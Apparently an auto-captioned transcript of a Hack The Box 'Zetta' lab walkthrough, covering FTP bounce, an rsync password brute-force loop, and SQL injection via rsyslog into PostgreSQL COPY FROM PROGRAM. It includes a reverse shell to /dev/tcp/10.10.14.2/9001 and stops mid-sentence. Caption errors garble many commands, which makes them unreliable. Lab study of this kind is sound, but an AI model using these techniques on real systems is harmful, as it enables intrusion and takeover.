 what's going on YouTube this is hip sack and we're going to be doing Zetas from AK the box which was a really fun box that stretched off with doing an FTP bounce attack to leak an ipv6 address and then you scan that ipv6 address and see additional services listing on the Box such as the our sync service that you can do a bunch of cool things too and eventually upload an SSH key to get on that box once you're on the box you'll notice that our syslog is storing logs in a sequel database and not doing any sanitization so through syslog you're gonna perform a sequel injection on a per square sequel server that allows you to execute commands as root and because you can execute commands as root through that sequel injection well you are rude at that point so a really fun path on the box and then after all that is done we'll use Python to build an arcing brute force err that utilizes sockets and threading because we're going to do a brute force to get on to arcing to begin with but a method of brute forcing is gonna be really bad and we'll just improve on it so with all that being said let's just jump in as always begin with it and map so - as c4 default scripts as V numerator 0 a output all formats when the end map director and call it Zetas and then the IP address which is 10 10 10 156 this can take some time to run so I've already ran it looking at the results we have just three ports open the first one being FTP on port 21 and is running the software peer FTP D at least that's what nmap thinks it is we don't see any version information or any scripts running for FTP so there's one I always like testing for and that is anonymous logins an nmap is really good at just giving you information but it's really bad at telling you bad things or negative things meaning if it doesn't run a script or script fails and map doesn't really tell you I'm sure there's a way to enable debugging but there's so many scripts that run an nmap it's just not easy to manage so there's always a few things I like testing for if an map doesn't tell me and for FTP that is anonymous login so I just tried logging in with anonymous anonymous and we get login failed so nothing really there however we do get some key pieces information number one the banner is telling us the time it's not a critical leak but it's always nice to know especially when it comes to doing some type of crypto they can get the server time to make sure your client is saying to the server and it can also potentially leak time zones of the servers so if you're doing something on like tour or something this can kind of give you a rough geolocation the server if it's not just set to UTC the second thing we get is ipv6 connections are also welcome on the server so definitely let's take a look at both of those things the other two ports that nmap sees is SSH on port 22 and from the banner we can see its openness is 87.9 running on debian 10 and then we also have HTTP on port 80 and that is running nginx so real quick let's just go and make sure or a cherry tree has some notes of what we found with ftp and then we'll check out the webserver going over to Cherry Tree I'm gonna press ctrl n to create a new node and we're going to call it Zetas which is the name of the box and then ctrl shift and to create a new child node to just call it notes and we can say FTP and the very first thing is local time week and then the second thing is ipv6 is available but do not know address so if you check out the sneaky video that I have on my channel there's a bunch of different ways we can get this address that are not gonna be the way we show so I definitely recommend doing that if you won't look into some ipv6 things I do like a 30 minute ipv6 intro in that video so I just don't want to redo everything when I've already done it once so let's just check out the website going to 10 10 10 156 will reveal the zetas page eventually once the page decides to load it's taking quite a while so it finally loaded and we can see a relatively pretty sight I'm just gonna view the source real quick to see if there's anything that sticks out maybe it's WordPress Joomla and I can recognize it by some JavaScript or something it loads and looking at it everything I see so far is HTML and it doesn't look like a lot of links go anywhere so maybe it's just a single page layout going to the bottom see if we see anything but looks relatively we can see the copyright which is 2019 which is when the box came out so it looks like it's up to date as well looking at everything we see a lot of just random text and one of the things that sticks out is native FTP because this isn't random and it's actually talking about what it says like if we look at the Android app it just goes into gibberish but FTP says they support FTP with fxp no idea what this is and some high number RFC so let's just take a note of this webpage FXP and RFC 24:28 so two things we should look at and because I always like having some type of recon going on in the background while I work I'm going to start up a go bust on this website so we're just gonna do go Buster dir for directory mode - you URL and then - W for word list user share word list doorbuster then directory list - 3 medium dot txt and save it to the out file of go Buster - root dot out so let's keep going down through the page FTP storage is done SFTP s3 and dual stack isn't there so SFTP and s3 say 0 % dual stack says 60% no idea what that means keep going down we have potential users roid [ __ ] Jen Barbara Maurice Moss and Douglas random people from the IT Crowd so we can take a note of the users so users copy paste copy pay whoa ok Jen Barbara and then Maurice moss okay Maurice moss and then Douglas Reynold so we had some information if we find like an email of a user so maybe check Facebook Google Twitter LinkedIn on all these we could potentially get the username structure so a lot of companies may use like first initial last name or something and if we get one of them we may be able to leak user names for all of them so just nice to get don't see anything you can see their storage amount and we see use the blue credentials on a shiny FTP server to start sharing and we get username and password for FTP so I'm going to put on the notes web page FTP creds and paste that so that looks like everything again all the links are going nowhere so let's go check out the FTP server go Buster hasn't found anything just yet so FTP 10 10 10 156 and it takes a little while to get the username prompt but once it does we can login with the username and password do a dir on the server we don't see any files at a - a and we can see the existence of a FTP quite a file so let's try to download it with get dot get FTP quota and we see prohibited file name and if we do an LS let's do LS - a we don't have the file we could try uploading a file so if we upload test and put test and then let's try to browse to test we get a 404 not found we could try guessing an FTP directory like squiggly FTP or just FTP in general and if we find that TP directory maybe we can upload files to and then get code execution through the web server looking back at go Buster it hasn't really found anything so we're still at nothing I'm gonna delete the FTP file we uploaded and then exit out so when I'm at nothing I go fall back - doing more recon and then researching so the Recon I want to do is a full port scan so and map - P - to do all ports Oh a all formats output - and map Zetas - all ports - Vida increase the perversity just one allows you to see the open ports as it finds it and then 10 10 10 156 so kicking that off we can see it discovered three ports we knew about these already so while it does that let's just go take a look at our notes and there's two things FX B and RFC 24:28 so let's go research what both of these are so going over to google searching FX P go to the Wikipedia page and if you read this essentially you'll find out that FX P is a way to command to FTP so is to transfer a file between each other for the purpose of when your client is on low bandwidth and this may make more sense when we find a network diagram to explain it but it does highlight a risk and that makes your server vulnerable to a ftp bounce attack and what this is is when you connect it to the ftp server you issue a port command to tell the ftp server to connect somewhere else and when it does that you can do a port scan through that server to enumerate the local internal subnet of it local ports listening on the box or maybe just scan a different victim and hide the fact who is scanning so there's a bunch of various things you can do with it it's very similar to like open mail relays using SMTP so let's just add this little note FXP ftp bounce attack and let's go take a look at what RFC 24 28 is oh actually we want to look at the diagram of FX b so FX speed diagram this one looks fine go here come on open view image and here we go we have the FX p client in server 1 and server - so we're connecting to server 1 and then saying hey server 1 expect a file and someone goes ok I'm expecting a file on port 49 2:48 so now we connect to the second server and say hey we want you to connect somewhere and send a file and it responds says ok and we told it to connect to server 1 on port 49 2 48 so after it says ok it makes that connection back to server 1 and they begin the file transfer so this is very rarely used but can be useful if like your client is on a low bandwidth link and you wanted a transfer a file between several 1 and server - and don't want to expose any protocol other than FTP so you may not want to say hey I don't want to give them access to SSH because they can run commands but I also want to allow them to send files between two servers so kind of a weird niche use case but that is what FXP is so let's take a look at RFC 24:28 and looking at this it is an extension for ipv6 and Nats and essentially it replaces the port command with eport so eport space delimiter net port delimiter net address delimiter tcp port and net port this is 1 or 2 one is ipv4 two is ipv6 net address that is the host name or IP or whatever and port you know what that is so when you combine these two things you have a way to enumerate the ipv6 address of the server and that's handy because a lot of times administrators may forget about ipv6 and only apply firewalls to ipv4 so let's do this attack so let's go over here make sure the username and password is on my clipboard and we can do NC 10 10 10 156 to connect to this box wait we have specify the port so port 21 and it looks like it takes a little while for the prompt to come back but there we go so we can log in with user and then the hostname username and then pass and then the password and we get logged in so now we can do the eport command specify ipv6 and then we gotta give it our IP v6 address so let's do if config tun 0 right B via sex addresses right here dead beef to 1000 and then the port 9000 1 now before we do this we should listen on ipv6 so NC - 6 lv NP 9001 and cat doesn't or NZ doesn't support it but endcap should we don't have any cat so let's app to install and cat to install it and while it's processing we can just start this listener up LLB NP we can do - 6 I guess the order of arguments doesn't matter but start this and we have a syntax error Oh e port delimiter to ipv6 port so now we told server 1 we're server 2 is and when we do a list he connects back and runs that command if there was a file in here let's um shoot let's do F TP 10 10 10 156 because we deleted that file it may not make perfect sense so let's put that file back there and then this will make much more sense so well again put test ok there's now a file there so let's do that neck cat command again there we go and do list I guess we have to do that a port again paste list there we go so he connects and sends the output of that command to server 2 so that is the port bounce and a way to enumerate the ipv6 address of that server so we can control C out of that net cat session go back here and we can replace the port on our full port scan with the pv6 port and we can also specify - six to make this an ipv6 scan we can do Zetas - all ports ipv6 and let this run and while it runs I guess we can take notes at what we did I be musics available combined with FX be to leak ipv6 address and move this here says RFC 24 28 okay before there we go there's some notes go back here and we'll just wait for this port scan to finish and it's been about five minutes and we discovered another point we didn't know about 8730 so what I'm going to do is copy this IP and I'm going to start a second end map to identify what 8730 is so just do n map - six the IP address and we can do - sv - p 8730 so this will just enumerate versions and we see it says it is our sync and we can confirm that we're probably just doing a net cat on that so if we met cat - 6 pesos in 8730 we connect and we see it's our sync D specifically version 31 so if we just try the command or a sink and then the IP address colon 8730 and when it comes to ipv6 generally put the IP address and quotes and we can do - - list - only - West files sure and it wants a password maybe we specify our sync colon slash slash there we go since this is plain text by default it was trying to do SSH if we do SSH - 6 - P 8730 and paste this in does it connect key exchange - V let's see it's trying and looks like it just doesn't accept SSH at all ok so lists only will list files you may want to specify - a just like FTP list all files and we can see various directories so we can try them this looks like the root of a web server or a Linux server and we get access denied for these directories if we try to list them we can try listing some even though they aren't here like Etsy and when we do we get a list of directories so it's odd we don't have Etsy listed here but when we do it we get it so the other directory I'm going to try is slash home and it doesn't work so I'm going to do Etsy and we're going to earth sing it to the directory or sync slash Etsy I'm going to make dirt - P or a sink slash Etsy get rid of this list only and now in this directory we're starting to get files if you added the - beef of a boost it'll show you the files as it has copying and if you don't know our sink you can always just man our sink and that's how you'd learn the way the wind or whatever so like list onlys there if you do - air you can see things but command is finished so let's go poke in the server's etsy directory so CD or a sync CD at sea the key thing i want to look at is file dates so it did preserve them so we can see server is very active July 27 ufw that's the firewall so applications D we can cat this to see the configuration cat OpenSSH see is there any IP table stuff fine grap IP table we can see IP tables cat rules dot v4 and we can see all the rules they have on this server to see how they're configured looking at it I don't really see any vulnerabilities kind of odd that it has routable IP addresses here but other than that nothing too interesting we look at ipv6 and it's completely empty so that's why we could scan the server on ipv6 because forgot to apply the v4 rules to v6 and it's relatively common again check out the sneaky video for a lot more stuff on ipv6 more importantly I'm kind of curious about the earth configuration so I'm gonna do earth oh we could also actually before do that look at passwd get users on the box we got a Postgres user roy so user names in the context of just user name or a first name but that's it the other users didn't have valid user names only roy so if we can't shadow probably didn't pull it yeah we can't even see the shadow file so let's less or a sink d dot comp for config and we can see exactly how its configured so been only allows this host boot only allows this host Oetzi temporally disable access to etsy for security reasons and we see it only allows a local host and denies on all of ipv4 and this is kind of weird my guess at how our sink is working is let's it probably puts a allow and then deny all so if you configure in a while it will allow that host and if the host is on that it's good if you don't allow anything there's probably no denial but if you put a deny in here it's going to remove that deny all and turn it into a deny IP address and this allow puts an IP address here but because it changed that bottom rule which was it deny the deny all's not there and since it's only specifying ipv4 that's why we can list it over ipv6 is my guess so that deny is probably changing a blanket deny all statement in the source code i haven't confirmed that but that's my hunch at exactly what's happening so if you want to allow only specific host probably don't try putting a deny statement in because it could lead to what we're seeing here list equals false is hiding the directory from view and we also have it with an exclude dot get so this is interesting let's put notes or sink doc get directories excluded and list equals false /fc config so let's keep going down this config Lib Lib 64 opt whatever all the same thing and then we get to homeboy and this is read right since read only a set to no user ID is Roy GID is Roy uses is roy secrets files are sink d secrets and list is false so do that and let's search for that file and this config does exist so must try downloading it Oh is there our sink command oh it was in a different window I do this do I have it there we go oh right down the whole let's see directory so we should be able cat nursing d dot secrets no such file or directory if we are a sink this and do the list only - a let's do verbose list only to list all the files we can list look through a thing for our sink and if we go through this we have message of the day comp but no secrets so if we specifically list for this file Etsy or sync d dot secrets we can see it and if we try downloading it so if we just put period to try downloading we get a permission denied let's try listing Etsy shadow so we can list the files specifically but we can't download them the one interesting thing that we have leaked right here is the file size so if we do at sea or sink D secrets and let's do - Q for quiet mood so I think it hides the message of the day I guess I can't do - AV list only oh yeah list only is probably hiding it but anyways it gives you the file size so our sync ID is 13 bytes big and if we look at our sync secrets the actual format of this file will see that it expects plaintext credentials let's see first thing decom we're secrets okay so missile would expects username : password so knowing the user name is roy that is going to be Roy : password in order to get that file size to be 13 the passwords either 8 characters or nine characters so it could be Roy : nine characters and four plus nine is equal to 13 what could be Roy : eight and then a line break so I'm gonna guess the password is a characters or nine characters so let's build a word list I'm gonna do a grep for extended grip this allows me to do regular expressions and we're gonna specify starts with some type of character 8 comma 9 for eight or nine characters and then dollar sign for end and then we'll do user share word list rockeo text and we can see we'll only grabbing all the eight or nine character passwords out of rockeo I'm going to pipe that to word list dot txt so we're shrinking the word list from let's see WC - L for list ext RockYou is this big and we shrunk it to this amount which is still a pretty large number but well below half of that so it should speed up the attack quite a bit so now we can do a brute force and earth sink supports passwords and a variable so how this is going to work we're going to do a shell script first and at the end of the video we're actually going to code a cool Python script to do this and make it threaded but that'll probably take like a half hour and I don't wanna make you sit through that if you don't want to so at the end we'll have a little Python coding session so let's VI Brutus H we're due for pass in cat word list txt do export or a sync password is equal to pass and then or a sink - Q or a sink ROI hat I forgot what the IP address was so let's grab it so if we we can just run this whole command there we go paste this and then home ROI and do - - list only and we can hide all error messages and then we can do a if the exit code of that last command is equal to 0 then it completed successfully so we will echo pass is equal to pass and then break two eggs now and then to exit that we just do Fi and we can end the loop I'm also going to echo this so we know what attempt just happened that may be good bash I'm horrible at bash scripting looking at this we have two things here and we erased his username okay let me make sure that's his correct home directory let's go to the bottom and the directory is home underscore Roy that's good so I think we are good so if we execute brute on SH we should just see a bunch of probably ones Oh God something bad is happening ctrl C to have no new file directory - Oh / Devon all miss that one okay so all the exit code is doing so if we go oh we're getting a lot of zeros Oh there we go passes computer so what that did was essentially I think if I put this echo up here so we'll try this with a bad password this is that we'll explain it so we'll export our sync underscore password is equal to please subscribe so now we have the password in our environment and then we run this command and echo this we get five because the command failed the same thing with if we cat a file if we can't test and echo this it's zero but if we care to follow that doesn't exist like support me on patreon because by the numbers if you're watching this chances are you don't but if we echo this it's one because the command failed so that gets the exit code of the last command that was ran the reason why we got a bunch of zeros is because we're getting the exit command of this if statement so I did that one poorly but we saw and exited with computer and once it did that now is the password so chances are if we do I thought I just killed that hole what did I removed from my script I just moved the exit code there we go but if we export the Earth Singh password to be computer and then run the same command the home row thing we don't get an error message before we did so definitely have something we just can't view any files so I'm going to add the - a to see what happens to do all we don't get anything a V for verbose don't get anything let's try home Roy / I'm not sure why we're not getting anything let's get rid of this cue okay for some reason the cue was suppressing the output of the files I'm not in our sync expert but there we go we got a bunch of files so let's make derp our sync home Roy and our sync all the files there so we do that to our sync boy and we'll specify - AV so to copy all files and then verbose so we can list them as we get them so if we go into Etsy or a sink oh boy we can see we downloaded all the files his bash history set to nothing there's the user dot txt which is the flag and we got dot to do XML so if we look at this let's just do it in vim them to do we can see an XML file done yes so I'm gonna ignore done yes I'm just gonna stretch before it done equals no add more contents to the home page we don't care about that screenshots to mobile apps don't care don't care this is on the server HTTP done no let's see testing they didn't test it they don't have HTTPS and they don't have any monitoring let's look at the next thing network test ipv6 yes add IP 6 table rules nope check ibv for specific service they haven't FTP testing testing monitoring no rsync rework or sink t comp because the security incident enable what not syslog server so this is kind of going through a checklist of what's on the server so that to do was teo do for to do compare syslog versus versus log birthdays just a small game ins test none rework syslog to push all events to DB so that's interesting we can do notes syslog events to DV normally syslog doesn't stored events directly in a database it's normally like file or Splunk or something readwrite GUI for syslog DB access view so they want to make the syslog a webpage it looks like so maybe it's in progress or something security run - and remediate findings so they haven't really done a Linux enumeration script change password scheme from secret at user name to something more secure so chances are the password is password at user ID so maybe Roy's password is computer at Roy so we can try logging in with that and that's the end so notes PW scheme user at PW at username so let's try SSH Roy at 10-10-10 156 and I try the username computer password computer at Roy and we don't get in so if we remember back to the configuration file this directory was readwrite so what I'm going to do is make there SSH we'll go into this and I'm going to do SSH key Jen and we're going to just create IDRs a drawer empty passphrase I'm gonna move ID or SI dot pub to authorized keys I'm going to CH own 1000 1000 to idrs to everything and chmod 600 maybe you have these on my box cat Etsy passwd graft 1000 I don't have that user on my box so it turns out you can set the UID if you don't have the user interesting but I just did that so versing preserves permissions then it will preserve them when it copies it up so I'm going to man our sink search for preserve to see if there's a flag preserve herd links - P so gonna make sure we do the - be-because SSH is very picky about it permissions so now we can do we'll do our sync password equals computer it should still be my environment variable but I'm just putting it here or a st. : look I do sing SSH we can do - a pv ROI at what's the IP address cat this and we will paste okay so we sent the files so if we do SH - I SSH ID RSA ROI at 10 10 10 156 and it still asks us we do list only let's look at what's going on oh we did the copy wrong it didn't copy the directory it only copied the keys so there's no dot SSH directory so let's go up one directory and our sync the files there we go what's right this way nursing - directory Oh Roy there we go so we sent this so now it's synced the files I bet if we did this SSH command again and didn't put this slash it would have copied the directory but because we put this trailing slash it thought we wanted to copy the files inside this directory and only sent that and not the directory structure that's my guess at what just happen there oh let's specify where this is now more slash dot SSH and we're finally on this box so we can do sudo de shell and we get command not found let's clean up authorized keys and ID or si since it should be a net dot SSH directory that we created so on this box what can we do I guess we can run a Linux script and this to do said run a script I'm not familiar with so Linus was it Lennis server no let's look at what it said monitoring where is it run run - ly n is so github LAN is security auditing for Linux did god this is big well why do we have this on this locate ly n is locate not found fine / - dev null grep - I ly n is I know fine has the - name thing but I like doing grep just because I know the syntax and I can make a case insensitive pretty easy the scripts not there does this have a release 48 releases come on please be just one bash script or an executable I can run only the source code I haven't actually ran the script before I think get clone CD ok this should be relatively easy let's just try this let's do CD up get clone script and we can do CD home slash boxes or HD B boxes Zetas are sync Etsy dot a seiche no or a sink Oh Roy dot SH s EP i ID RSA Roy at 10 10 10 156 and we want to send it the file a directory opt - there we go and we are : so now it's sent directory it's gonna be slow let's just tie this up Tara - CJ V F line s dr. dot i think that's bz b z - up - okay SCP this file there we go that's gonna be much faster turn ZX v f xj v f ly n is dr. bz - sweet we got the script and it wants us to CD into it we did dot slash lin s audit system audit system henna can't open change ownership functions to roof or sem what so I'm just not going to run the script so I'm not sure exactly what it wants us to do but looks like this wants to be owned by root for it to work so we'll ignore that step in the to do and instead will supplement it with their own when X script and that's going to be privileged escalation scripts awesome sweet and we can do Lynn peas and then Python - M simple HTTP server I know this is Python - and I guess we can do Python 3 because it is 20/20 Python 3 - m HT p dot server there we go never probably make one person happy all right curl 10 10 14 - which is my IP 8000 Lynn pssh pipe it to bash curl not found we have W get W get not found and C and C not found oh man let's just SCP this file SCP limpy's - roy at and 1010 156 and we can specify the key at home HB boxes Zetas and got a seiche now our sink Oh Roy dhatus h-heidi RSA bashed wind peas and now we're finally running it so we'll let the script run and then look over exactly what it found so now that it's done let's just look at it I'm searching back for the syntax and then we can just go through this let's see pings available the kernel I'm guessing at 2019 July 19th relatively recent probably not a kernel probe ask writable path system stats and vironment I'm just scrolling down and looking for red or colors when unexpected process is run by root for some reason I'm guessing maybe it thinks Roy is Roo I don't know exactly what is doing here cron jobs not interesting do we have groups do this put groups up at first I'm using a group we can search for it after that just highlight okay we'll keep going available software crontab this is outdated versions of software network information we got the Hearst name in the box of course we could just on host name IP address IP tables active ports can we sniff with TCP dump search by checking - capabilities and things and there we go my user we are Oi we're member of admin so we can read log cd-rom whatever video I think we can actually like get a picture of what standard out on the server is PGP keys clipboard super users on the Box users with console logins users password policy I think it's grapping for like password stuff here we've got Postgres on the box config files we can probably view this file now our sync d dot secrets but we know this contents are it's probably roi : computer sex ports again just looking at the red things for anything that sticks out and we don't have anything that stuck out through a quick glance I put something my clip without cursing secrets pretty cat that I guess we can't I guess we have to be rude yep only root can read that I guess if we're I could read that then we probably could have just downloaded it I don't know so the next thing I do probably let's look at when user dot text was created July 27th so I'm just going to do find slash Etsy - newer MT and then we'll do 2000 1907 27 and then not a newer MT of to the 1907 28 and there's a lot of files in Etsy that modified at that time so let's see can we do timestamps let's say 0 5 0 0 and we'll say instead of 20 that I'm just looking at files on the box they're doing a little bit of instant response type thing so file between these two dates is that going to work sweet I think we got less instance so - Devon all so we can see our syslog D pure FTP D and that may be about it so doing that and putting it to that time frame took it down to 38 lines and before specifying the hour the flag was created and just doing the day we had a thousand things so always searching box is based upon time frames can give some help so we got ok FTP first grass and our syslog so let's take a look at Etsy your FTP D and we got a config database and get so we go DB LS la we got off now let's see Kat Kampf 10x DAF I don't know exactly how this is doing authentication crap okay paste and search all files grabbed a char I was trying to find where it's best buying usernames and passwords to dump it I don't know I guess we can do get logged - P - view changes of this because there is a get directory so this will show us I guess them configuring it I'm guessing us that xtal thing but it's gotta be off Kat bar on FTP nope cat 65 UNIX no 70 Pam no yeah I'm not sure exactly how they're specifying the username but didn't look like anything there let's go back to the find command next one is Postgres so CD Postgres get log - p11 okay we don't have a get directory here but we have a Postgres ident calm and permission denied paris grass comp - I user doesn't like it I'm guessing the password for this is probably in the ident comp file so can't really get past without a Postgres let's go back to this find and see what else we have we do have our syslog dot d PG SQL comp less PG SQL calm permission denied but there is a get directory so we can do get log - P and we can see things so they remove this line localhost syslog UID our syslog and oh password let's see so they're adding a template constant insert into syslog lines message values and so right here they are inserting a syslog entry into a database it doesn't look like we have any type of escapes or anything and load om PG SQL if we search our syslog this we get Postgres SQL output so the logging stuff to a purse Christ database and there we go local 7th info which is a log level type Postgres local host user Postgres password test one two three four so that looks good let's go back here notes Postgres past one two three four all right test one two three four okay keep going down and there's nothing else so I'm going to do SSL NPT to view open ports first grass 5432 so let's go take a look at that we can do it's weird it's listening on ipv6 on that butter add map did not see that so something block that unique but we can get on it on localhost so let's go htb boxes Zetas or a sink Roy home Oh muy got SH and I'm going to do SSH - el 54 32 so it's gonna listen on port 53 54 32 of my box for to through ssh and end up on localhost 5432 roy 10 10 10 156 i think is the IP but to specify - i ID RSA if you're ever confused about port forwarding check out the video or EDD is H reddish because this explains port forwarding in great detail but now that we have that port open I should be able to do PG SQL - h4 hostname localhost psql okay localhost oh do we have PS q all in this box I did God darn it I'm not used to having utilities let's see psql - you first grass - capital u Postgres - p - you first grass different behavior on these two things maybe I did the SQL - H localhost - you / stress okay yeah so we didn't have to forward the port I just jumped the gun there but we try logging in we get pass through failure so that doesn't really help us however we do know something it is logging into Postgres syslog lines message device reported time and values so in Postgres there is a table called syslog lines and the column message and device reported time and it's doing values single quote and then doing a property msg so this is going to be the syslog message and then single quote comma single quote property time reported date format whatever so right here we can probably control this MSG line by injecting invalid sequel commands and we should be able to view any log in var log because we are a member of the ADM group so if you do an LS la here a lot of logs are readable by ADM so I can do fine - readable and look at the logs Postgres has a log that's readable so if we're trying to inject reading logs out of Postgres sounds like it would be really nice so we do logger - p local seven I think dot info test and we put a single quote we an error message so in this a message we see insert into syslog lines values test and then the single quote killed it highly enough looks like it's kind of escaped but not escaped because it still caused an error but that stopped it from working so if we try this and then we do a print see - - space - it still failed so let's see value we can to test comet test we're trying to get it to not air which may be more difficult than it's worth I think we have the ability to just do stacked queries so we may just live with getting error messages but instead do a stacked query with just semicolon so maybe select star from syslog lines does that work test maybe I guess we can just try like making post grasping us so Postgres I think command output may help us ping command output first grass I think was in 9.3 they added ability to run command so 9.3 command execution there we go medium running commands on Postgres 9 3 let's see chop table if table exists create table copy CMD exec from program ID so what we can do that single quote and drop table if exists please subscribe and then create table please subscribe CMD helped put is text so we just created that table and we copy please subscribe I just a place wherever CMD exec was with please subscribe and noticed how complicated that may have made things from program ID from as a capital program ping 1010 14 - we want to do - add 1 + comma - - - and TCP dump - I done 0 ICMP let's try this we didn't get a ping and we can see it's escaping or single quotes which may be causing an error and Postgres has something weird with a double dollar being a single quote so this is just a weird purchasing of it having a different way to escape this [Music] can't find a good posting no high price should say first grass there we go the lexical structure let's see update that's not it and so text dollar quoting so it's got this weird thing so if you wanted to have quotes and your sequel statement you can use dollar dollar as a different way to do a quote so what we're going to do is replace or a single quote with dollar dollar and in order for bash not to process it I'm going to escape the first dollar because otherwise it would think it's a variable so do this and we still don't get anything so we probably have a weird error message and our sequel statement so let's review it easiest way to do this is copy this whole line go to a new pane B I'll put pasted and we want to put our command here and copy this paste CMD so let's take a look at this insert into syslog line values test so right here it is going to definitely fail because we're inserting two things into this and the reason why I had um not bother trying to do doubles is because of hell it's escaping these single quotes meaning like if I did comma backslash this like I still think that's a syntax error if I could put straight quotes I could easily make this one work so that is the issue I think we are running into because I think this sweet sequence is correct so let's see create table copy from program like that and then we comment it out everything else so let's see what could we have possibly messed up on I guess we could try putting null sometimes null gets evaluated specially so let's try test common all to tell the database it's nothing because sometimes you don't need to say what nothing is and we still got an error message let's see what if we do that still doesn't like it if we remove everything and just work with what we have make sure the error isn't coming out of the other stuff so there we go so doing this did fix it because we're no longer airing we're now running that well so let's run this again and see if it tells us what the error message is let's see insert into that drop table if exists please subscribe create table doesn't tell us what the error message is so let's run one of those commands so drop table if exists please subscribe and end it with the single quote so it's not airing there so create table can we create table we can so it's airing when we do our actual command so this copy please subscribe from program let's go back to this copy from program let's just do ID instead of paying ID so it's not airing it airs on ping ping - and 110 1014 - is where it has heartburn but looks like we can run ID just fine so that's weird do i do commands with a space so if i do echo Who am I doesn't air can i you i can't use quotes because i'm using quotes earlier i guess maybe i can do escapes okay let's add a dash just doesn't like ping weird let's try creating a file on the server so let's do CD tell v epic Sh then bash paying ten ten fourteen two and let's make sure that's oh shoot man paying i think i know what it is yeah i was doing a Windows box before this box and I screwed up my stupid ping argument that's why I normally test ping before I actually run it so let's go back to this ping and serve - n because n is the windows flag would do - see and there we go that's what it was so now we have a way to verify we have code execution let's go all the way back did we even need that null where's all this troubleshooting for nothing so here we are - C 1 so that troubleshooting wasn't for nothing because we needed to fix this null thing for that to work but more to save a few minutes so now let's get a reverse shell echo ping - N 1 - C 1 10 10 14 to type that to bash can we do it this way yes we can so the reason why I tested that is this confirmed we can now do base64 so we can do echo - N and we can do echo - n ash - I 0 and 1 dev TCP 1010 14 to 9000 1 0 and 1 that's the syntax we want for the reverse shell and we can pay 64 encode that and CoV NP 9001 paste that in phase 64 - D - and run this and now we have a shell as the Postgres user so with this I guess we can do it l SLA and we can see the Postgres SQL history and we also see SSH so we could cat dot ssh OS dawn ssh and get the RSA key and authorized keys so we could ssh into the box as Postgres if we really wanted to but let's take a look at that psql history and we have information so we have alter user Postgres with password this so we have the password for Postgres so let's go psql - h localhost - new Postgres paste the password and now we can get in so we could try select star let's see how do we dump users in Postgres first grass SQL chichi pen test monkey I know like MySQL you do select star from I think MySQL dot off Postgres let's see how we dump users current user list users select username from PG user and we only got one user and that is per stress so I was hoping for a root user that we could crack the password let's see how do we list databases select data name from PG database okay so we got template 0 and template 1 and syslog so we can we describe I use syslog I really don't know Postgres we could try going through this in enumerated Postgres but we can also try one other thing let's exit this and the site said the password scheme was password at user name so let's try a super secret pass at root so su - taste this at are 0 0 not 0 0 teeth and that was it so password reuse gets us in WC - see root X 33 and a line break so that is the box but I promised you something cool and I haven't actually done it or got it working just something I wanted to do and that was create a rsync brute force err because the ones on the internet like Hydra and stuff either don't support or sync I don't support ipv6 so let's do this and make a fun experiment out of it can we do this easily so make the code CD code and here's where we will begin we're going to create three different programs the first ones probably n take the longest it's going to be our sync login example because we have to kind of reverse how our sync works the second one is just gonna be a python threading example and the third one we're gonna combine the two so we have a brute-force sir that supports multiple threads so hopefully it's relatively fast so first things first we have to figure out how our sync works so I'm going to open up wireshark and we're gonna capture a login request so just go on tun zero and then we're going to do a sync password is equal to support me on patreon and then we're going to do the IP address so or a sink or a sink colon slash slash and then what is it history grep list all we're not have it or a sink we can grab this so paste the IP and then 8730 and with the step pacify username so we're du Roi act okay so this should ballgame there we go so we have a / sink thing and if we did home roy we get a failure okay that's what I expected to see so I'm going to restart this real quick and let's make sure we get a login failure there we go we will follow TCP stream we can see what happens we send it the earth sync version servers tells us it's version we send it the directory you want to access and the server goes hey here's a blob I don't know what that is and then we say hey here's my username here is a blob and so it was like cool you failed to login goodbye so let's figure out exactly what this is so actor - n base 64 - D and it's just junk and I guess we could do the other thing but again just junk and this looks like just based upon the flow some type of challenge response and it's done in order to prevent you from sending a plain text password over the wire what happens is when you commit the server gives you a challenge and then your response needs to be that challenge and then your password and then you hash it and then you just send that hash back so that's exactly how that works it's challenge response and we should figure out exactly how it's hashing it so a sync D off rack D login and let's look at things we got a post on Linux questions maybe someone's gonna explain this looks like it's talking about the configuration files that's definitely not it kind of informal and I may be wrong but it helped my understanding let's check what you are so if authentication is required is what happens we're challenged is a random string of base64 and the user or the client must respond with user response where user is the username they claim to be so ROI and response is the base64 sub-form of MD for hash the challenge plus the password so let's do this let's go Python three and then we can do well we should probably do something down here see decode B stuff go here and we'll just copy this piece of information so we have it paste cat stuff there we go so we need to put the challenge base64 is equal to this and I'm gonna encode it because Python three likes everything in bytes and then we know what the password was so where is it yeah it is copy and we'll do password is equal to this dot encode I didn't do dot dot in code so we've got two variables challenge with base64 one password and now we have to do all that base64 so from base64 import be 64 decode and be 64 encode so now we can do password be 64 is equal to be 64 encode password and we can do challenge is equal to be 64 decode shall be 64 and correct padding so I'm guessing it strips padding so I'm just adding equals in base64 that is the padding so we finally got it equalled so now we have to create the hashes so import hash Lib and we'll do M is equal to hash live dot new MD 4 and then we can finally do MDOT update and we'll do challenge plus pass password and we can do MDX digest and print the hash so now if we be 64 encode that we have to do in code there we go it's way too long so because it's a hash it should always be about this length in base 64 and that's like double and what's happening here is we probably want to just do digest and the difference between hex digest and digest is simply just how its represented so if we do MDOT digest and MDX digest all hex digest is is the hexadecimal form of this so that's all it is so if you do 1c that'll probably be backslash and 6:1 is probably X maybe or something but yeah so let's do base64 encode em digest and that's still not what we're looking for so we could change and try a bunch of brute-forcing to try to get exactly how it's working or we can just go and download the source code so i'm going to do debian SRC or a sink and we're going to download the source code debian dead 9 i want to say was dead 10 last dot dot slash and matt Zetas and Matt I didn't I'm gonna say 10 I guess I accidentally erased it and map doing something before but I think that's buster so we'll do Buster and down with Buster's source they probably don't change all that much so we got 3 1 3 we can save it and let's see exactly how they do this so we can do window make the SRC move downloads or a sink here terezi xvf or a sink go in and let's find grab off authenticate see sounds great and let's see we can grab avoid on this and see all the functions base 64 encode generate challenge generate hash authenticate client we probably want to do generate hash because in challenge out so probably password challenge out we don't really care how its generating that random blob for the challenge so let's look at gen hash generate hash and we have generate md5 hash created from the combination that password and challenge string and returned it base64 so summon it some update in some update challenge so it does two hashing functions so let's change it that way so we can do M is equal to new to reset or md4 go back to update and it did in first which is the password and then it did challenge we just call it a Chow there we go and then be 64 encode and that's still not we're looking for we want it to say for K and it's saying WY so let's go back to new and we'll try password and we'll give it the challenge base 64 and we'll try this again and that's still not what we're looking for so we have to figure out exactly what's going on here and just before call some update it initializes it with some underscore net so let's look at these functions where they're used so grab - R to go through all files I some underscore in it and we have checksum dot C so searching through some 